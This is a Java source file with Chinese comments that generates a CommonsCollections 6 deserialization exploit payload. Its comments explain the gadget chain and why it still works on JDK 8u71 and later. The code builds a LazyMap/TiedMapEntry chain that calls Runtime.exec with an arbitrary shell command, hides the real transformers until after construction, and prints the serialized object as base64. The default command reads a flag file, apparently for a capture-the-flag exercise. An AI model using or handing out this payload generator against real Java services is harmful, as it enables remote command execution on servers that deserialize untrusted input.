import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/**
 * CommonsCollections 6 (CC6) —— 手写 payload 生成器
 *
 * 为什么是 CC6 而不是最有名的 CC1：
 *   CC1 依赖 AnnotationInvocationHandler.readObject()，而 JDK 8u71 之后
 *   那个方法不再调用 setValue()，链子断了。CC6 换了入口（HashSet/HashMap
 *   反序列化时算 hashCode），不碰那个类，所以 8u71+ 依然有效。
 *
 * 链子（从上往下读，就是对象被 readObject 之后自动执行的顺序）：
 *
 *   HashMap.readObject()
 *     └─ putVal(hash(key))                 反序列化重建哈希表时会算 key 的哈希
 *        └─ TiedMapEntry.hashCode()
 *           └─ getValue() → map.get(key)    map 就是下面那个 LazyMap
 *              └─ LazyMap.get()             key 不存在 → 调 factory.transform()
 *                 └─ ChainedTransformer.transform()
 *                    ├─ ConstantTransformer(Runtime.class)
 *                    ├─ InvokerTransformer("getMethod","getRuntime")
 *                    ├─ InvokerTransformer("invoke")
 *                    └─ InvokerTransformer("exec", String[]{"/bin/sh","-c",...})
 *
 * 关键技巧：构造阶段先用"假的" transformer（ConstantTransformer(1)），
 * 否则 map.put() 的那一刻命令就在本地跑起来了。等对象图搭好、把 LazyMap
 * 里的 key 清掉之后，再反射把 iTransformers 换成真的链。
 */
public class Cc6Gen {

    public static void main(String[] args) throws Exception {
        String command = args.length > 0 ? args[0] : "cat /flag > /tmp/out/flag.txt";
        String[] execArgs = new String[]{"/bin/sh", "-c", command};

        // 1. 先搭个无害的壳，避免构造过程中就触发
        Transformer[] fake = new Transformer[]{new ConstantTransformer(1)};
        ChainedTransformer chain = new ChainedTransformer(fake);

        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "k");

        // 2. put 会立刻算一次 hashCode → 触发 fake 链，同时把 "k" 塞进 lazyMap
        Map<Object, Object> outer = new HashMap<Object, Object>();
        outer.put(entry, "v");

        // 3. 必须清掉，否则反序列化时 LazyMap.get("k") 直接命中缓存，不再调 factory
        lazyMap.remove("k");

        // 4. 换成真正的利用链
        Transformer[] real = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String[].class},
                        new Object[]{execArgs}),
        };
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chain, real);

        // 5. 序列化，base64 打到 stdout
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(bos)) {
            oos.writeObject(outer);
        }
        System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
